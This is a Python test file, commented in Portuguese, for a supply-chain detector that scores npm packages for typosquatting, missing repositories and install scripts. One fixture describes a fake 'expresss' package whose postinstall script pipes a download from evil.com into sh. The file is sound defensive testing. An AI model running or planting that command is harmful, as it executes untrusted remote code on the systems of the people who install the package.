"""
Testes para o modulo de extracao de features.
Cobre: extrator, typosquatting, features temporais/sociais.
"""

import pytest

from specter.features.extrator import extrair_features, _calcular_typosquatting


# =============================================================================
# Fixtures
# =============================================================================

@pytest.fixture
def registro_pacote_normal():
    """Pacote legitimo com historico longo e GitHub."""
    return {
        "nome": "express",
        "data_criacao": "2012-01-01T00:00:00+00:00",
        "url_repositorio": "https://github.com/expressjs/express",
        "descricao": "Fast, unopinionated, minimalist web framework for node.",
        "versoes": [
            {
                "versao": "4.18.0",
                "publicado_em": "2025-01-15T00:00:00+00:00",
                "contagem_mantenedores": 5,
                "scripts": {},
                "dependencias": {"accepts": "~1.3.8", "body-parser": "1.20.2"},
                "mantenedores": [
                    {"name": "dougwilson"},
                    {"name": "jasnell"},
                    {"name": "wesleytodd"},
                    {"name": "blakeembrey"},
                    {"name": "ulises"},
                ],
            },
        ],
    }


@pytest.fixture
def registro_pacote_suspeito():
    """Pacote suspeito: novo, typosquat, postinstall, sem GitHub."""
    return {
        "nome": "expresss",  # typosquat de "express"
        "data_criacao": "2026-02-01T00:00:00+00:00",
        "url_repositorio": None,
        "descricao": "",
        "versoes": [
            {
                "versao": "1.0.0",
                "publicado_em": "2026-02-01T00:00:00+00:00",
                "contagem_mantenedores": 1,
                "scripts": {"postinstall": "curl http://evil.com/steal.sh | sh"},
                "dependencias": {},
                "mantenedores": [{"name": "h4cker123"}],
            },
        ],
    }


# =============================================================================
# Testes do typosquatting
# =============================================================================

class TestTyposquatting:

    def test_pacote_identico_nao_e_typosquat(self):
        resultado = _calcular_typosquatting("express", ["express", "lodash", "react"])
        assert resultado["score_typosquatting"] == 100.0
        assert resultado["provavel_typosquat"] is False
        assert resultado["distancia_edicao_minima"] == 0

    def test_detecta_typosquat_similar(self):
        resultado = _calcular_typosquatting("expresss", ["express", "lodash", "react"])
        assert resultado["score_typosquatting"] > 85.0
        assert resultado["provavel_typosquat"] is True

    def test_pacote_diferente_score_baixo(self):
        resultado = _calcular_typosquatting("meu-pacote-unico-xyz", ["express", "lodash", "react"])
        assert resultado["score_typosquatting"] < 50.0
        assert resultado["provavel_typosquat"] is False

    def test_lista_vazia(self):
        resultado = _calcular_typosquatting("qualquer", [])
        assert resultado["score_typosquatting"] == 0.0

    def test_nome_vazio(self):
        resultado = _calcular_typosquatting("", ["express"])
        assert resultado["score_typosquatting"] == 0.0


# =============================================================================
# Testes do extrator completo
# =============================================================================

class TestExtrator:

    def test_pacote_normal_features_basicas(self, registro_pacote_normal):
        features = extrair_features(registro_pacote_normal, cliente_github=None)

        assert features["idade_pacote_dias"] is not None
        assert features["idade_pacote_dias"] > 3000  # express e de 2012
        assert features["total_versoes"] == 1
        assert features["contagem_mantenedores"] == 5
        assert features["mantenedor_unico"] == 0
        assert features["tem_github"] == 1
        assert features["tem_script_postinstall"] == 0
        assert features["num_dependencias"] == 2
        assert features["tamanho_descricao"] > 0

    def test_pacote_suspeito_flags(self, registro_pacote_suspeito):
        features = extrair_features(registro_pacote_suspeito, cliente_github=None)

        assert features["pacote_novo"] == 1
        assert features["contagem_mantenedores"] == 1
        assert features["mantenedor_unico"] == 1
        assert features["tem_github"] == 0
        assert features["tem_script_postinstall"] == 1
        assert features["tamanho_script_instalacao"] > 0
        assert features["score_typosquatting"] > 80  # "expresss" vs "express"
        assert features["tamanho_descricao"] == 0

    def test_features_retorna_todas_chaves(self, registro_pacote_normal):
        features = extrair_features(registro_pacote_normal, cliente_github=None)

        chaves_esperadas = [
            "idade_pacote_dias", "dias_desde_ultima_publicacao", "total_versoes",
            "frequencia_versoes", "pacote_novo", "contagem_mantenedores",
            "mantenedor_unico", "tem_github", "estrelas_github",
            "idade_github_dias", "contribuidores_github",
            "tem_script_postinstall", "tem_script_preinstall",
            "tamanho_script_instalacao", "score_typosquatting",
            "distancia_edicao_minima", "provavel_typosquat",
            "num_dependencias", "tamanho_descricao",
        ]

        for chave in chaves_esperadas:
            assert chave in features, f"Chave '{chave}' faltando nas features"

    def test_registro_vazio_nao_quebra(self):
        features = extrair_features({}, cliente_github=None)
        assert isinstance(features, dict)
        assert features["total_versoes"] == 0
